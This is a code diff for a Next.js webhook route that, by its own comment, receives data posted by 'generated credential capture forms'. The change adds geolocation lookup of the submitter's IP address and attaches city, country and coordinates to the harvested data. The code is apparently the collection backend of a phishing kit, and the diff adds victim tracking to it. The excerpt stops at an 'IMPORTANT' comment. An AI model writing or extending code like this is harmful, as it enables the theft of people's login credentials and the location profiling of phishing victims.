@@ -1,19 +1,29 @@
 
 import { NextRequest, NextResponse } from 'next/server';
+import { getGeoIpInfo } from '@/services/ip-geo-service';
 
 // This is the webhook that the generated credential capture forms will post to.
 export async function POST(req: NextRequest) {
     try {
         const formData = await req.json();
+        const ipAddress = req.ip || req.headers.get('x-forwarded-for') || 'Unknown';
         
+        let geoInfo = null;
+        if (ipAddress !== 'Unknown') {
+            geoInfo = await getGeoIpInfo(ipAddress);
+        }
+
         // Enhance the captured data with request information
         const capturedData = {
             ...formData,
             timestamp: new Date().toISOString(),
-            // In a real deployment, you could get more accurate location data
-            ipAddress: req.ip || req.headers.get('x-forwarded-for'),
+            ipAddress: ipAddress,
             userAgent: req.headers.get('user-agent'),
             source: req.headers.get('referer'),
+            city: geoInfo?.status === 'success' ? geoInfo.city : 'N/A',
+            country: geoInfo?.status === 'success' ? geoInfo.country : 'N/A',
+            latitude: geoInfo?.status === 'success' ? geoInfo.lat : 'N/A',
+            longitude: geoInfo?.status === 'success' ? geoInfo.lon : 'N/A',
         };
 
         // --- IMPORTANT ---
